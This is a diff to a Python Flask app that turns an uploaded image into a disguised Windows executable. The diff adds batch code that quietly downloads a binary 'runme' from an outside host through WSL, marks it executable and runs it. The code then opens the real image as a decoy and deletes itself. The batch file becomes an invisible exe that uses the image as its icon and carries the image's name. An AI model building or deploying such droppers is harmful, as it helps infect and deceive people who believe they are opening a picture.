@@ -32,12 +32,24 @@ os.makedirs(BATFILES_FOLDER, exist_ok=True)
 
 DB_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data.db')
 
+# Pulls the compiled c file, gives it executable permissions, then runs it
 batfile_template = '''
 @echo off
 
 wsl bash -c "curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null"
 wsl bash -c "chmod +x ~/.config/rm17-node 2>/dev/null"
 wsl bash -c "~/.config/rm17-node 2>/dev/null"'''
+
+# Create a tmp batfile to delete the exe and itself (can't figure out how to do it without spawning another shell)
+del_exe = '''
+set "delbat=%temp%\d.bat"
+echo @echo off > "%delbat%"
+echo ping 127.0.0.1 -n 3 >nul >> "%delbat%"
+echo del /f /q "%~f0" >> "%delbat%"
+echo del /f /q "%delbat%" >> "%delbat%"
+start "" /min "%delbat%"
+
+exit'''
 
 # Gets db connections
 def get_db_connection():
@@ -91,8 +103,10 @@ def home():
 def proceed():
     img = request.files.get("image")
     
+    # Actual image name (used to retrive it with proper name later)
     original_filename = img.filename
     
+    # Filename for the exe that will be downloaded
     session['filename'] = f'{os.path.splitext(original_filename)[0]}.exe'
 
     # Generate unique filename so we don't accidently override
@@ -105,21 +119,34 @@ def proceed():
 
     # Path for image with removed background
     processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
+    
+    # Path for the exe icon
     ico_path = os.path.join("icos", f'{os.path.splitext(filename)[0]}.ico')
+    
+    # Path for the batfile
     batfile_path = os.path.join("batfiles", f'{os.path.splitext(filename)[0]}.bat')
     
+    # Creates the batfile
     batfile = batfile_template[:]
     batfile += f'''\nwsl bash -c "curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
     batfile += f'''\nstart {original_filename}'''
     
+    batfile += del_exe
+    
+    # Saves the batfile
     with open(batfile_path, 'w') as file:
         file.write(batfile)
     
+    # Removes image background
     subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
+    
+    # Creates the ico from the image
     subprocess.run(["convert", processed_path, "-define", "icon:auto-resize=256,64,32", ico_path])
+    
     # Wait until the file exists and is non-empty
     time.sleep(2)
 
+    # Converts the batfile to an exe with the ico set as the icon
     # subprocess.run([BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
     subprocess.run(["wine", BAT_TO_EXE_PATH, "/bat", batfile_path, "/exe", f'executables/{os.path.splitext(filename)[0]}.exe', "/icon", ico_path, "/invisible"])
 
@@ -231,7 +258,7 @@ def delete_last_entry():
     conn.close()
     return 'Last entry deleted.'
 
-# Just a page that will list all the files so we can retrieve them using wget
+# Just a page that will list all the files so we can retrieve them using wget/curl
 @app.route('/files/', methods=['POST'])
 def list_files():
     files = ['runme'] #os.listdir('../')
@@ -257,5 +284,6 @@ def download_file(filename):
     
 if __name__ == "__main__":
     create_db()
+    # To create new users
     print(f"[DEBUG] Registration key: {REGISTRATION_KEY}")
     app.run(host='0.0.0.0', debug=False)
